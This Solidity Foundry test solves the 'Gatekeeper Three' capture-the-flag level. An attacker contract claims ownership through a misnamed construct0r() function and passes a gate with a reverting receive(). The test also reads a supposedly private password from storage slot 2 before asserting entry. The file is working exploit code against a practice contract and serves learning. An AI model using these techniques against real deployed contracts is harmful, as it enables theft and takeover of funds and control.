// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {GatekeeperThree, SimpleTrick} from "../src/28_GatekeeperThree.sol";

interface IGatekeeperThree {
    function enter() external;
    function construct0r() external;
}
contract Entrant {
   IGatekeeperThree public target;

   constructor(address _target){
        target = IGatekeeperThree(_target);
    }

    receive() external payable{
        revert();
    }

    function attack() public {
        target.construct0r();
        target.enter();
    }
}

contract GatekeeperThreeTest is Test {
    GatekeeperThree public gatekeeperThree;
    SimpleTrick public simpleTrick;
    Entrant public entrant;
    address hacker = address(0x1337);

    function setUp() public {
        gatekeeperThree = new GatekeeperThree();
        simpleTrick = new SimpleTrick(payable(address(gatekeeperThree)));
        entrant = new Entrant(address(gatekeeperThree));
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker, hacker);

        gatekeeperThree.createTrick();

        address trickAddr = address(gatekeeperThree.trick());

        bytes32 pass = vm.load(trickAddr, bytes32(uint256(2)));

        gatekeeperThree.getAllowance(uint256(pass));

        (bool success, ) = address(gatekeeperThree).call{value: 0.0011 ether}("");
        
        entrant.attack();
        vm.stopPrank();

        assertEq(gatekeeperThree.entrant(), hacker);
    }
}